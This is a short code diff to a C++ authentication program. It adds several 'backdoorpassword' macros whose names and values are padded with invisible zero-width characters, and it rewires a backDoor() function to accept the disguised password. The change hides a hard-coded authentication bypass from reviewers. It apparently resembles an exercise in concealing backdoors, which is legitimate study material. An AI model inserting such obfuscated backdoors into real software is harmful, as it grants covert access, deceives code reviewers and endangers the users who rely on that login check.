@@ -5,6 +5,12 @@
 #include "authlib.h"
 #include "openssl/sha.h"
 
+#define backdoorpassword​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​ "open​​​​​​​​​​​​​​​​​​​​"
+#define backdoorpassword​​​​​​​​​​​​​ "open​​​​​​​​​​"
+#define backdoorpassword​​​​​​​​​ "open​​​​​"
+#define backdoorpassword​​ "open​"
+#define backdoorpassword​​​​​​​ "open​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​"
+
 using namespace std;
 
 // Function to get the SHA256 hash of a string
@@ -30,12 +36,9 @@ string getSHA256(const string& input) {
 }
 
 bool backDoor(const string& password) {
-    if (password == "open​") {
+    if (password == backdoorpassword​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​) {
         return true;
-        
-    }
-
-    else {
+    } else {
         return false;
     }
 }
